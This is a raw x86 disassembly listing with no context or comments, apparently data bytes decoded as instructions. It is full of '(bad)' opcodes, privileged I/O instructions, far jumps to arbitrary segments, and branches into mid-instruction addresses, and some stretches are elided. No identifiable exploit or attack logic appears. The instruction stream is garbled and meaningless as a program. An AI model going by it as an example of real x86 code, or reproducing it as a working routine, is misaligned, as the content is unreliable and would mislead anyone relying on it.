  42b7bf:	inc    esp
  42b7c0:	add    edi,DWORD PTR [edx+0x780eebe6]
  42b7c6:	push   DWORD PTR [ebx]
  42b7c8:	sbb    eax,0xc80a777b
  42b7cd:	fbstp  TBYTE PTR [ebx]
  42b7cf:	push   edx
  42b7d0:	pusha  
  42b7d1:	mov    bl,0xf3
  42b7d3:	rol    BYTE PTR [ecx-0x36],1
  42b7d6:	cmp    esp,DWORD PTR [edi-0x3c263018]
  42b7dc:	fcomp  DWORD PTR [ebx-0x63]
  42b7df:	mov    WORD PTR ds:0x21dd395b,ss
  42b7e5:	ficomp WORD PTR [edi]
  42b7e7:	dec    edi
  42b7e8:	and    dl,0xce
  42b7eb:	clc    
  42b7ec:	push   ebx
  42b7ed:	jbe    0x42b7d3
  42b7ef:	cld    
  42b7f0:	or     al,0xa
  42b7f2:	stos   DWORD PTR es:[edi],eax
  42b7f3:	lock cmp eax,0xc922655e
  42b7f9:	aas    
  42b7fa:	les    eax,FWORD PTR [ebp+0x44]
  42b7fd:	xor    al,0x36
  42b7ff:	xor    eax,0xb4f77f58
  42b804:	or     cl,BYTE PTR [ebx]
  42b806:	stc    
  42b807:	cmp    edx,DWORD PTR [edx]
  42b809:	mul    bl
  42b80b:	ret    0x9e4d
  42b80e:	aaa    
  42b80f:	inc    esi
  42b810:	pop    edx
  42b811:	inc    edi
  42b812:	cmp    al,0x58
  42b814:	fadd   st(3),st
  42b816:	mov    bl,0xd0
  42b818:	popa   
  42b819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b81a:	cmp    al,0xd
  42b81c:	stc    
  42b81d:	cdq    
  42b81e:	imul   ebx,ecx,0x728908d4
  42b824:	xchg   ebx,eax
  42b825:	test   eax,0x2d8c63c4
  42b82a:	cli    
  42b82b:	pop    es
  42b82c:	loope  0x42b7bb
  42b82e:	and    ebp,esp
  42b830:	shr    ecx,cl
  42b832:	rcl    edx,1
  42b834:	nop
  42b835:	cld    
  42b836:	xor    BYTE PTR [ebp-0x36],0x3f
  42b83a:	das    
  42b83b:	mov    ebx,0xe3b1ef3
  42b840:	jno    0x42b821
  42b842:	cmp    al,0xb1
  42b844:	pop    ecx
  42b845:	and    al,bl
  42b847:	fnstsw WORD PTR [edx+0x5]
  42b84a:	lods   al,BYTE PTR ds:[esi]
  42b84b:	lea    esp,[eax]
  42b84d:	sbb    DWORD PTR [edi],ebp
  42b84f:	rol    BYTE PTR [esp+edx*4-0x6e],cl
  42b853:	outs   dx,BYTE PTR ds:[esi]
  42b854:	mov    al,0x14
  42b856:	jne    0x42b8a6
  42b858:	push   0x7613b96d
  42b85d:	mov    dl,0xbf
  42b85f:	jl     0x42b83f
  42b861:	or     DWORD PTR [esi-0x56753a49],esi
  42b867:	dec    esp
  42b868:	sub    edx,DWORD PTR [edi-0x2e]
  42b86b:	mov    al,0xfb
  42b86d:	jne    0x42b8eb
  42b86f:	adc    DWORD PTR [edx+ecx*2],ebp
  42b872:	and    ebx,DWORD PTR [ecx+0x54]
  42b875:	jmp    0x2859f641
  42b87a:	fmul   DWORD PTR [ecx]
  42b87c:	mov    al,0xf4
  42b87e:	std    
  42b87f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b880:	jg     0x42b871
  42b882:	daa    
  42b883:	sti    
  42b884:	jge    0x42b8c5
  42b886:	add    ecx,ebp
  42b888:	test   eax,0x9283e030
  42b88d:	mov    esi,0x47a1
	...
  42b8f2:	add    BYTE PTR [eax],al
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     edx,DWORD PTR [edi+ebx*1]
  42b902:	inc    ebp
  42b903:	lahf   
  42b904:	int3   
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	push   esi
  42b90d:	jb     0x42b8c0
  42b90f:	xchg   ecx,eax
  42b910:	stc    
  42b911:	(bad)  
  42b912:	into   
  42b913:	fcomip st,st(3)
  42b915:	xor    bh,BYTE PTR [ecx-0x6c]
  42b918:	dec    ebp
  42b919:	jmp    DWORD PTR [esi+esi*4+0x43]
  42b91d:	test   DWORD PTR [ebx],ecx
  42b91f:	add    esi,DWORD PTR [edi]
  42b921:	fsubr  QWORD PTR ss:[ebp+0x71]
  42b925:	shl    dl,1
  42b927:	js     0x42b932
  42b929:	leave  
  42b92a:	ret    0x3bab
  42b92d:	adc    ch,ah
  42b92f:	lods   eax,DWORD PTR ds:[esi]
  42b930:	(bad)  
  42b931:	and    cl,BYTE PTR [esi+0x7f22b4cc]
  42b937:	xor    DWORD PTR [edx-0x13],eax
  42b93a:	mov    eax,0xf5490212
  42b93f:	mov    esi,0x51a6813b
  42b944:	scas   eax,DWORD PTR es:[edi]
  42b945:	inc    ebx
  42b946:	retf   0x4820
  42b949:	dec    ebx
  42b94a:	cmovo  ecx,DWORD PTR [ecx+0x35]
  42b94e:	dec    esp
  42b94f:	mov    bh,0x49
  42b951:	clc    
  42b952:	(bad)  
  42b953:	nop
  42b954:	scas   al,BYTE PTR es:[edi]
  42b955:	cmpxchg BYTE PTR [eax+0x60],dh
  42b959:	in     al,0x57
  42b95b:	sti    
  42b95c:	popf   
  42b95d:	xor    BYTE PTR ds:0x616f2905,bh
  42b963:	pop    esi
  42b964:	ins    DWORD PTR es:[edi],dx
  42b965:	in     eax,0xf5
  42b967:	(bad)  
  42b968:	hlt    
  42b969:	inc    edi
  42b96a:	mov    DWORD PTR [ebx],ecx
  42b96c:	rcr    bl,0x41
  42b96f:	inc    ebp
  42b970:	inc    ebx
  42b971:	mov    edx,0x7b2a6c5d
  42b976:	xchg   ebx,eax
  42b977:	imul   BYTE PTR [edi-0x38]
  42b97a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b97b:	ss (bad) 
  42b97d:	rcr    BYTE PTR [ebp+0x638d10cd],1
  42b983:	jo     0x42b934
  42b985:	out    dx,al
  42b986:	mov    dh,0x33
  42b988:	daa    
  42b989:	pop    esi
  42b98a:	inc    eax
  42b98b:	scas   al,BYTE PTR es:[edi]
  42b98c:	xor    BYTE PTR [ebp+0x140aa3e6],bl
  42b992:	cli    
  42b993:	das    
  42b994:	inc    esp
  42b995:	rcr    ecx,0xda
  42b998:	mov    fs,ecx
  42b99a:	jb     0x42b9cd
  42b99c:	(bad)
  42b99f:	mov    ah,0x2d
  42b9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9a2:	jmp    0xcd62e7a2
  42b9a7:	out    dx,eax
  42b9a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b9a9:	pop    edi
  42b9aa:	xor    ch,BYTE PTR [eax-0x1fb81594]
  42b9b0:	adc    eax,0xccc2410
  42b9b5:	(bad)  
  42b9b7:	xchg   edx,eax
  42b9b8:	out    0xee,eax
  42b9ba:	sbb    al,BYTE PTR [esi]
  42b9bc:	jmp    0x42b9b0
  42b9be:	push   0xbd3ed01b
  42b9c3:	sub    bh,BYTE PTR [edi-0x11]
  42b9c6:	aas    
  42b9c7:	sbb    dh,ch
  42b9c9:	ret    
  42b9ca:	sbb    cl,BYTE PTR [eax-0xf]
  42b9cd:	in     eax,0x9a
  42b9cf:	ret    
  42b9d0:	aam    0x55
  42b9d2:	xchg   ebp,eax
  42b9d3:	jg     0x42b9f6
  42b9d5:	rcl    BYTE PTR [edi+0x1805f13a],cl
  42b9db:	lds    esp,FWORD PTR [ecx+0x1589f72f]
  42b9e1:	in     ax,0x19
  42b9e4:	stos   BYTE PTR es:[edi],al
  42b9e5:	test   DWORD PTR [esi-0x2f359204],esi
  42b9eb:	jbe    0x42b9bc
  42b9ed:	jo     0x42b9aa
  42b9ef:	ja     0x42b98f
  42b9f1:	pop    ebp
  42b9f2:	loop   0x42ba09
  42b9f4:	sub    eax,0x3a123667
  42b9f9:	mov    BYTE PTR [ebp+0x69],bh
  42b9fc:	jns    0x42b9a0
  42b9fe:	fidiv  DWORD PTR [edi+0x3d]
  42ba01:	dec    esp
  42ba02:	(bad)  
  42ba03:	outs   dx,BYTE PTR ds:[esi]
  42ba04:	and    eax,0x3efbb8b9
  42ba09:	cmp    eax,0x9ccfd256
  42ba0e:	adc    dh,BYTE PTR [eax+eax*1+0x0]
	...
  42ba72:	add    BYTE PTR [eax],al
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [eax],eax
  42ba81:	pusha  
  42ba82:	test   ch,bl
  42ba84:	rcl    dl,1
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    al,0x1
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	sar    eax,0x1
  42ba8f:	cld    
  42ba90:	lds    ecx,FWORD PTR [edi]
  42ba92:	aad    0x3a
  42ba94:	xor    eax,0xf91fb805
  42ba99:	sbb    bh,bh
  42ba9b:	mov    ds,WORD PTR [eax]
  42ba9d:	outs   dx,DWORD PTR ds:[esi]
  42ba9e:	jmp    0x8060e2ee
  42baa3:	jae    0x42ba33
  42baa5:	in     eax,0xef
  42baa7:	cmp    BYTE PTR gs:[edi+0x5f],dh
  42baab:	cmp    dh,BYTE PTR [edx-0x3a615397]
  42bab1:	mov    ds:0xa60d49f2,eax
  42bab6:	inc    ebx
  42bab7:	fild   WORD PTR [ebx+0x33]
  42baba:	(bad)  
  42babb:	xor    DWORD PTR [edi],esp
  42babd:	mov    ebx,0xa7b84e14
  42bac2:	test   BYTE PTR [esi-0x29],ah
  42bac5:	mov    esi,0xc9757e17
  42baca:	mov    ecx,0x244e5a40
  42bacf:	sub    al,0x44
  42bad1:	lock cmp al,0x33
  42bad4:	std    
  42bad5:	push   edx
  42bad6:	sbb    eax,DWORD PTR [ebx+ecx*4]
  42bad9:	adc    ecx,edx
  42badb:	jmp    0x24a2:0x1655e0c2
  42bae2:	or     ah,bh
  42bae4:	clc    
  42bae5:	jle    0x42baf1
  42bae7:	(bad)  
  42bae8:	std    
  42bae9:	or     DWORD PTR [edi-0x71eaa932],0xe88be1e8
  42baf3:	sub    esp,0xffffff94
  42baf6:	and    esp,DWORD PTR [esi+0x15]
  42baf9:	bound  eax,QWORD PTR [eax]
  42bafb:	inc    ecx
  42bafc:	je     0x42bb5f
  42bafe:	lods   eax,DWORD PTR ds:[esi]
  42baff:	xchg   esp,eax
  42bb00:	(bad)  
  42bb01:	lock inc edx
  42bb03:	imul   DWORD PTR [ebp-0x329d1377]
  42bb09:	jmp    0xf170:0xc3c40717
  42bb10:	xchg   ebp,eax
  42bb11:	inc    ebp
  42bb12:	int    0x3f
  42bb14:	adc    ecx,esp
  42bb16:	adc    ebx,esp
  42bb18:	call   DWORD PTR [esi+0x43]
  42bb1b:	inc    ebx
  42bb1c:	inc    ebp
  42bb1d:	das    
  42bb1e:	dec    edi
  42bb1f:	push   ecx
  42bb20:	es hlt 
  42bb22:	and    ch,BYTE PTR [esi+0x5e]
  42bb25:	cmp    edx,esp
  42bb27:	or     al,0x62
  42bb29:	out    dx,eax
  42bb2a:	cmp    esi,DWORD PTR [esi]
  42bb2c:	push   ss
  42bb2d:	mov    eax,ds:0x633f5673
  42bb32:	sbb    DWORD PTR ds:0xed763cf5,esp
  42bb38:	lahf   
  42bb39:	fs aaa 
  42bb3b:	fiadd  WORD PTR cs:[edx-0x49]
  42bb3f:	int3   
  42bb40:	xchg   ebp,eax
  42bb41:	or     ch,BYTE PTR [esi]
  42bb43:	fldl2t 
  42bb45:	lods   eax,DWORD PTR ds:[esi]
  42bb46:	sub    al,0x3
  42bb48:	nop
  42bb49:	and    esi,esi
  42bb4b:	imul   esp,ebp,0x833014a0
  42bb51:	mov    edi,?
  42bb53:	das    
  42bb54:	into   
  42bb55:	cld    
  42bb56:	test   eax,0x43336b66
  42bb5b:	ror    BYTE PTR [ecx+0x6d],cl
  42bb5e:	sbb    ah,BYTE PTR [esi+esi*8+0x54bdd4cd]
  42bb65:	jg     0x42bbba
  42bb67:	retf   
  42bb68:	(bad)  
  42bb69:	retf   0xfc24
  42bb6c:	sbb    BYTE PTR [ecx+0x5d],al
  42bb6f:	call   0xd64a:0x100ed4a6
  42bb76:	mov    eax,0x24364075
  42bb7b:	add    BYTE PTR [ecx-0x38618f94],0xec
  42bb82:	out    0xa4,al
  42bb84:	and    al,0x22
  42bb86:	mov    edx,0xb8f43931
  42bb8b:	in     al,0x7a
  42bb8d:	and    BYTE PTR [ecx+0xd],dl
	...
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	add    BYTE PTR [ecx+edi*8],al
  42bc03:	cmp    esp,edx
  42bc05:	rol    DWORD PTR [ecx],cl
  42bc07:	add    BYTE PTR [ecx+eax*1],al
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	jmp    0x42bc67
  42bc0e:	jns    0x42bc52
  42bc10:	aas    
  42bc11:	sahf   
  42bc12:	cmp    bl,BYTE PTR [edx]
  42bc14:	les    edi,FWORD PTR [edx+ecx*1-0x5a53667c]
  42bc1b:	jne    0x42bbd4
  42bc1d:	sub    eax,0x36d9f224
  42bc22:	inc    ebx
  42bc23:	into   
  42bc24:	mov    dl,0x6a
  42bc26:	or     edx,0x3e
  42bc29:	clc    
  42bc2a:	dec    esp
  42bc2b:	lods   eax,DWORD PTR ds:[esi]
  42bc2c:	setle  BYTE PTR [esi-0x42]
  42bc30:	dec    eax
  42bc31:	push   eax
  42bc32:	ret    0x4a9c
  42bc35:	push   0x60
  42bc37:	out    0x84,eax
  42bc39:	aaa    
  42bc3a:	mov    ebx,0xeb2787e3
  42bc3f:	mov    ch,0xe0
  42bc41:	mov    eax,DWORD PTR [ebx-0x5b]
  42bc44:	pop    eax
  42bc45:	rcl    BYTE PTR [eax-0x69],cl
  42bc48:	push   ecx
  42bc49:	pop    es
  42bc4a:	push   ecx
  42bc4b:	add    edi,esp
  42bc4d:	and    ebp,DWORD PTR [edi+ebp*4-0x68]
  42bc51:	adc    ch,ch
  42bc53:	(bad)  
  42bc54:	push   edi
  42bc55:	and    ecx,eax
  42bc57:	outs   dx,BYTE PTR ds:[esi]
  42bc58:	rol    BYTE PTR [eax+ecx*2-0x2462504b],1
  42bc5f:	ret    
  42bc60:	imul   ecx,DWORD PTR [ebx+0x69],0x3a06c238
  42bc67:	inc    esi
  42bc68:	dec    esi
  42bc69:	mov    ah,0xa5
  42bc6b:	loope  0x42bc20
  42bc6d:	cmp    ch,dh
  42bc6f:	ret    
  42bc70:	sahf   
  42bc71:	dec    edx
  42bc72:	dec    edi
  42bc73:	xor    eax,0xea0af820
  42bc78:	mov    al,ds:0x7050b2eb
  42bc7d:	push   cs
  42bc7e:	cmp    DWORD PTR gs:[edi-0x5c007d2c],eax
  42bc85:	div    DWORD PTR [eax+0x54]
  42bc88:	or     BYTE PTR [ecx-0x3821f9b5],bh
  42bc8e:	out    dx,eax
  42bc8f:	loop   0x42bc5b
  42bc91:	repnz (bad) 
  42bc93:	es repz ja 0x42bca0
  42bc97:	push   0x22
  42bc99:	lahf   
  42bc9a:	adc    al,0x7d
  42bc9c:	daa    
  42bc9d:	push   cs
  42bc9e:	mov    dl,0x8c
  42bca0:	cmp    al,0xf3
  42bca2:	jbe    0x42bc63
  42bca4:	mov    ebx,0xb53d6717
  42bca9:	xor    ebp,DWORD PTR [ecx+0x15]
  42bcac:	and    al,0x47
  42bcae:	jbe    0x42bca3
  42bcb0:	xchg   ecx,eax
  42bcb1:	pop    esp
  42bcb2:	or     ecx,DWORD PTR [ebp+0x38c0e4d]
  42bcb8:	mov    ecx,esp
  42bcba:	inc    DWORD PTR [ecx]
  42bcbc:	or     ebx,DWORD PTR [edx-0x2845a56b]
  42bcc2:	adc    eax,0x731bda17
  42bcc7:	scas   al,BYTE PTR es:[edi]
  42bcc8:	pop    eax
  42bcc9:	cmp    DWORD PTR [esp+ebx*8-0x5f2977d],esp
  42bcd0:	mov    bl,0x42
  42bcd2:	ffree  st(6)
  42bcd4:	cs out 0x47,eax
  42bcd7:	gs mov edx,0x9789ad9f
  42bcdd:	pop    ds
  42bcde:	mov    ds:0x318e0272,eax
  42bce3:	(bad)  
  42bce4:	mov    ah,0x2c
  42bce6:	ja     0x42bd08
  42bce8:	(bad)  
  42bce9:	stos   DWORD PTR es:[edi],eax
  42bcea:	aaa    
  42bceb:	cmp    DWORD PTR [edx-0x2b],edx
  42bcee:	mov    bl,BYTE PTR ds:[edx]
  42bcf1:	mov    ebx,cs
  42bcf3:	div    BYTE PTR [edi-0x3]
  42bcf6:	jecxz  0x42bce8
  42bcf8:	bnd jno 0x42bd07
  42bcfb:	jmp    0x5006:0xdeed002
  42bd02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd03:	push   eax
  42bd04:	dec    ecx
  42bd05:	loope  0x42bce8
  42bd07:	sbb    DWORD PTR [ebx],ebp
  42bd09:	ins    BYTE PTR es:[edi],dx
  42bd0a:	into   
  42bd0b:	jo     0x42bce6
  42bd0d:	nop
  42bd0e:	xor    ah,0x0
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd3e
  42bd81:	sub    al,0x3c
  42bd83:	cwde   
  42bd84:	fcom   st(4)
  42bd86:	add    DWORD PTR [eax],eax
  42bd88:	add    al,0x1
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	mov    esi,0xaa41a28f
  42bd91:	pop    es
  42bd92:	xor    DWORD PTR [esi],edx
  42bd94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd95:	daa    
  42bd96:	xchg   ebx,eax
  42bd97:	dec    esi
  42bd98:	fst    st(6)
  42bd9a:	mov    bl,0xc2
  42bd9c:	mov    al,0xa5
  42bd9e:	or     esp,DWORD PTR [edx]
  42bda0:	lds    edi,FWORD PTR [ebx+0x7e]
  42bda3:	pop    eax
  42bda4:	xchg   esi,eax
  42bda5:	fwait
  42bda6:	lea    ebp,fs:[edx*4+0x45e183fe]
  42bdae:	dec    esi
  42bdaf:	xchg   ecx,eax
  42bdb0:	jb     0x42bdb4
  42bdb2:	adc    eax,DWORD PTR [edi+0x6a1200c0]
  42bdb8:	cmp    al,0xec
  42bdba:	cdq    
  42bdbb:	jns    0x42bdda
  42bdbd:	jo     0x42bd9a
  42bdbf:	(bad)  
  42bdc0:	pop    ss
  42bdc1:	in     al,dx
  42bdc2:	pop    esp
  42bdc3:	pop    esi
  42bdc4:	xchg   edx,eax
  42bdc5:	mov    cl,0xea
  42bdc7:	jle    0x42bd59
  42bdc9:	shl    DWORD PTR [eax],cl
  42bdcb:	aaa    
  42bdcc:	jp     0x42bdfb
  42bdce:	call   0xae186a1f
  42bdd3:	and    BYTE PTR [ebp+0xa01d6a],ah
  42bdd9:	xchg   edi,eax
  42bdda:	mov    ecx,0x93149921
  42bddf:	add    esp,edi
  42bde1:	pop    ds
  42bde2:	shr    bl,1
  42bde4:	sub    eax,esp
  42bde6:	dec    edi
  42bde7:	fcmovnbe st,st(2)
  42bde9:	out    0xdb,eax
  42bdeb:	sub    eax,0x5e4c4b66
  42bdf0:	clc    
  42bdf1:	daa    
  42bdf2:	add    al,0xde
  42bdf4:	push   ecx
  42bdf5:	pop    edi
  42bdf6:	or     eax,DWORD PTR [eax-0x7]
  42bdf9:	sub    ch,al
  42bdfb:	dec    ebx
  42bdfc:	lea    ebp,[edx-0x28]
  42bdff:	or     BYTE PTR [eax+0x30],0xac
  42be03:	mov    fs,WORD PTR [ecx+0x5c]
  42be06:	jo     0x42be2c
  42be08:	xor    BYTE PTR [edx],0x73
  42be0b:	loop   0x42be81
  42be0d:	mov    eax,ds:0xc2668e95
  42be12:	and    BYTE PTR [edx],bl
  42be14:	js     0x42be71
  42be16:	call   0xc3e75ba0
  42be1b:	bound  ecx,QWORD PTR [ebx+ecx*4]
  42be1e:	cs jp  0x42be1e
  42be21:	mov    bh,0x3e
  42be23:	jle    0x42bddd
  42be25:	outs   dx,DWORD PTR ds:[esi]
  42be26:	loope  0x42be1a
  42be28:	aas    
  42be29:	sbb    bl,BYTE PTR [edx-0x2f]
  42be2c:	out    0xae,eax
  42be2e:	lods   eax,DWORD PTR ds:[esi]
  42be2f:	aad    0x9a
  42be31:	sbb    DWORD PTR [esi+0x2a],ebx
  42be34:	repz and ch,ch
  42be37:	sbb    eax,0x75f04faa
  42be3c:	rcr    DWORD PTR [ecx+eax*1],cl
  42be3f:	add    al,0xd6
  42be41:	and    al,0x47
  42be43:	xor    eax,DWORD PTR [ebx-0x23]
  42be46:	ret    
  42be47:	sub    edx,DWORD PTR [esi]
  42be49:	std    
  42be4a:	iret   
  42be4b:	mov    ecx,DWORD PTR [eax-0x2]
  42be4e:	test   al,0xb0
  42be50:	mov    eax,ds:0x20897396
  42be55:	retf   0x83e7
  42be58:	add    dl,BYTE PTR [esi+eiz*4+0x21]
  42be5c:	sahf   
  42be5d:	icebp  
  42be5e:	xor    DWORD PTR [ebx+eax*4],edi
  42be61:	call   0x941:0x66a260d9
  42be68:	les    esp,FWORD PTR [esi+0x39]
  42be6b:	push   cs
  42be6c:	pop    edi
  42be6d:	aaa    
  42be6e:	into   
  42be6f:	lea    edi,[edx]
  42be71:	and    edx,DWORD PTR [esi]
  42be73:	pop    ss
  42be74:	enter  0x1cec,0x2f
  42be78:	pop    eax
  42be79:	push   ecx
  42be7a:	xchg   esi,eax
  42be7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be7c:	enter  0xbe76,0xae
  42be80:	sahf   
  42be81:	mov    al,ds:0xd829898c
  42be86:	inc    ecx
  42be87:	jae    0x42beaf
  42be89:	add    BYTE PTR [ecx+0x4c],0x38
  42be8d:	addr16 add bl,ah
	...
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x387bd7c8,eax
  42bf01:	mov    ds:0xd5dc2066,al
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    al,0x1
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	lods   al,BYTE PTR ds:[esi]
  42bf0d:	dec    ecx
  42bf0e:	jmp    0xf752b0ed
  42bf13:	jecxz  0x42bf42
  42bf15:	mov    ebx,0xca3ababd
  42bf1a:	das    
  42bf1b:	imul   edi,DWORD PTR [eax],0xffffffa1
  42bf1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf1f:	jnp    0x42beb2
  42bf21:	iret   
  42bf22:	sbb    cl,dl
  42bf24:	mov    esi,DWORD PTR [eax]
  42bf26:	lea    eax,[eax+0x61]
  42bf29:	(bad)  
  42bf2a:	retf   
  42bf2b:	lahf   
  42bf2c:	sar    cl,cl
  42bf2e:	xchg   edx,eax
  42bf2f:	je     0x42bee4
  42bf31:	lock sbb ebx,DWORD PTR [ebp+0x4134c759]
  42bf38:	jb     0x42bebc
  42bf3a:	jle    0x42bebe
  42bf3c:	outs   dx,DWORD PTR ds:[esi]
  42bf3d:	cs cdq 
  42bf3f:	dec    edx
  42bf40:	bnd js 0x42bf45
  42bf43:	cmp    dh,ah
  42bf45:	in     al,0xa3
  42bf47:	pop    ds
  42bf48:	sbb    DWORD PTR [edx],0x17
  42bf4b:	sbb    bl,BYTE PTR [ebx+0x5b]
  42bf4e:	fwait
  42bf4f:	mov    edx,DWORD PTR [ebp+0x47]
  42bf52:	jbe    0x42bf1f
  42bf54:	xchg   ebp,eax
  42bf56:	inc    ebp
  42bf57:	jl     0x42bfc5
  42bf59:	jne    0x42bee2
  42bf5b:	mov    bl,0x45
  42bf5d:	cmc    
  42bf5e:	cmp    al,0x44
  42bf60:	(bad)  
  42bf61:	pop    eax
  42bf62:	cdq    
  42bf63:	call   0x2684:0xcd477e35
  42bf6a:	std    
  42bf6b:	ins    DWORD PTR es:[edi],dx
  42bf6c:	lods   eax,DWORD PTR ds:[esi]
  42bf6d:	sbb    DWORD PTR [edx],0x10
  42bf70:	ss ror edi,0x8f
  42bf74:	call   0x9ed399a5
  42bf79:	pop    es
  42bf7a:	and    BYTE PTR [ebx+0x3b987197],bh
  42bf80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf81:	mov    al,0x37
  42bf83:	pop    eax
  42bf84:	adc    al,0x8d
  42bf86:	sub    esi,DWORD PTR [edx+edx*8+0x24]
  42bf8a:	pop    edi
  42bf8b:	push   0xffffffa9
  42bf8d:	mov    edi,eax
  42bf8f:	call   0x97753a5
  42bf94:	xor    al,0x25
  42bf96:	xlat   BYTE PTR ds:[ebx]
  42bf97:	shr    BYTE PTR [ebp-0x697faa5b],cl
  42bf9d:	push   edx
  42bf9e:	aad    0x42
  42bfa0:	xor    bh,bh
  42bfa2:	dec    edi
  42bfa3:	ds mov eax,0x10b63362
  42bfa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bfaa:	or     DWORD PTR [ecx-0x6eb9744c],0x6a
  42bfb1:	xor    ch,BYTE PTR [edi+0x3]
  42bfb4:	repz add BYTE PTR [edi+0x70e76305],dh
  42bfbb:	(bad)  
  42bfbc:	addr16 stc 
  42bfbe:	inc    edi
  42bfbf:	outs   dx,DWORD PTR ds:[esi]
  42bfc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfc1:	pop    ecx
  42bfc2:	sub    ebp,DWORD PTR [ebp+0x3b]
  42bfc5:	sbb    ebp,DWORD PTR [ecx+0x378f5adf]
  42bfcb:	xchg   edx,eax
  42bfcc:	fnstenv [edi+0x271f4999]
  42bfd2:	adc    al,0xbf
  42bfd4:	retf   0x1177
  42bfd7:	(bad)  
  42bfd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfd9:	mov    ecx,0x900a0f9e
  42bfde:	and    DWORD PTR [ecx+edx*2+0x1d],ebp
  42bfe2:	xchg   esp,eax
  42bfe3:	shl    BYTE PTR [ecx],0x21
  42bfe6:	jae    0x42c059
  42bfe8:	push   ebx
  42bfe9:	xchg   DWORD PTR [esp+ebx*1+0x69],ecx
  42bfed:	test   esi,eax
  42bfef:	inc    ebp
  42bff0:	test   DWORD PTR [ebx],0xebbbb03d
  42bff6:	lea    ebx,[edi+0x38f8e1e3]
  42bffc:	mov    ecx,ebx
  42bffe:	jne    0x42c042
  42c000:	nop
  42c001:	mov    edx,0xd5a98a10
  42c006:	add    BYTE PTR [esi-0x66d1ca71],dh
  42c00c:	mov    ebp,0xe51af3
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	sar    edi,cl
  42c082:	ja     0x42c0d0
  42c084:	loopne 0x42c05c
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	push   ebx
  42c08d:	es nop
  42c08f:	out    0xa9,al
  42c091:	jne    0x42c037
  42c093:	jns    0x42c0dc
  42c095:	or     DWORD PTR [edi+0x7a],eax
  42c098:	add    al,0xa4
  42c09a:	mov    esp,0xae637a6d
  42c09f:	mov    eax,ds:0x78b6f1ac
  42c0a4:	neg    BYTE PTR [edx+0x29bc083d]
  42c0aa:	enter  0x7214,0x15
  42c0ae:	call   0x861c:0x1236d5b8
  42c0b5:	aaa    
  42c0b6:	and    edx,esi
  42c0b8:	sbb    al,0x2c
  42c0ba:	(bad)  [esi+eiz*1]
  42c0bd:	out    0xa8,al
  42c0bf:	out    dx,eax
  42c0c0:	mov    cl,0x61
  42c0c2:	xchg   esp,eax
  42c0c3:	fmul   QWORD PTR [edi]
  42c0c5:	rcl    DWORD PTR [edi+0x2306ec5a],cl
  42c0cb:	ins    DWORD PTR es:[edi],dx
  42c0cc:	lods   eax,DWORD PTR ds:[esi]
  42c0cd:	test   al,0xea
  42c0cf:	xor    dh,dh
  42c0d1:	mov    eax,0x4dba35d1
  42c0d6:	outs   dx,DWORD PTR ds:[esi]
  42c0d7:	and    ah,dh
  42c0d9:	into   
  42c0da:	hlt    
  42c0db:	int3   
  42c0dc:	jle    0x42c07a
  42c0de:	lds    ecx,FWORD PTR [eax]
  42c0e0:	xchg   ecx,eax
  42c0e1:	rol    esp,0x56
  42c0e4:	mov    dh,0x7f
  42c0e6:	repnz int3 
  42c0e8:	je     0x42c0bf
  42c0ea:	sub    DWORD PTR [ecx+eiz*2],ecx
  42c0ed:	enter  0x215a,0xe6
  42c0f1:	fs add ecx,eax
  42c0f4:	(bad)  
  42c0f5:	in     al,0x94
  42c0f7:	xchg   esi,edi
  42c0f9:	stc    
  42c0fa:	addr16 cld 
  42c0fc:	dec    eax
  42c0fd:	jle    0x42c0e2
  42c0ff:	jnp    0x42c112
  42c101:	sbb    al,0x60
  42c103:	(bad)  
  42c104:	fcom   DWORD PTR [eax]
  42c106:	dec    edi
  42c107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c108:	scas   eax,DWORD PTR es:[edi]
  42c109:	shl    dh,0xa0
  42c10c:	into   
  42c10d:	loopne 0x42c152
  42c10f:	stc    
